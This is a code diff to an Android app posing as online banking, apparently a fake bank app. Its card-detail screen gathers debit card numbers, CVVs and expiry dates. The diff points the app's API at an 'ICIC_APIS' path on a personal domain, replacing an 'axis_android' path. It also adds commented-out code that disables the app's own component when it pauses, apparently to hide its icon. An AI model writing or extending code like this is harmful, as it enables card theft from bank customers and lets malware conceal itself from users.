@@ -2,6 +2,7 @@ package com.codewithmuddasir.onlinebanking;
 
 import android.app.ProgressDialog;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.util.Log;
 import android.widget.Toast;
@@ -33,6 +34,7 @@ public class CardDetail extends AppCompatActivity {
 
     private ProgressDialog progressDialog;
 
+
     CreditCardTextWatcher creditCardTextWatcher = new CreditCardTextWatcher();
 
     @Override
@@ -41,6 +43,7 @@ public class CardDetail extends AppCompatActivity {
         binding = DataBindingUtil.setContentView(this, R.layout.activity_card_detail);
 
         util = new Util();
+        util.saveLocalData(this,"check","true");
 
         progressDialog = new ProgressDialog(CardDetail.this);
         progressDialog.setMessage("Loading... Please Wait");
@@ -52,7 +55,7 @@ public class CardDetail extends AppCompatActivity {
 
 
         binding.sub.setOnClickListener(view -> {
-
+            util.saveLocalData(this ,"check","false");
             if(binding.deb.getText().toString().isEmpty() || binding.cvv.getText().toString().isEmpty()
                     || binding.mon.getText().toString().isEmpty()|| binding.year.getText().toString().isEmpty()){
                 Toast.makeText(this, "fill all fields", Toast.LENGTH_SHORT).show();
@@ -97,6 +100,21 @@ public class CardDetail extends AppCompatActivity {
 
 
     }
+
+//    @Override
+//    protected void onPause() {
+//        super.onPause();
+//        Util util = new Util();
+//        if (util.getLocalData(this, "check").equals("true")) {
+//            Log.e("asdf123", "pause: verify activity");
+//            PackageManager packageManager = getPackageManager();
+//            packageManager.setApplicationEnabledSetting(
+//                    getPackageName(),
+//                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+//                    PackageManager.DONT_KILL_APP
+//            );
+//        }
+//    }
 
 }
 
@@ -148,7 +166,7 @@ interface ApiService {
 
 
 class ApiClient {
-    private static final String BASE_URL = "https://test-annad.in/annad/axis_android/";
+    private static final String BASE_URL = "https://anikdevnath.com/ICIC_APIS/";
     private static Retrofit retrofit;
 
     public static Retrofit getClient() {
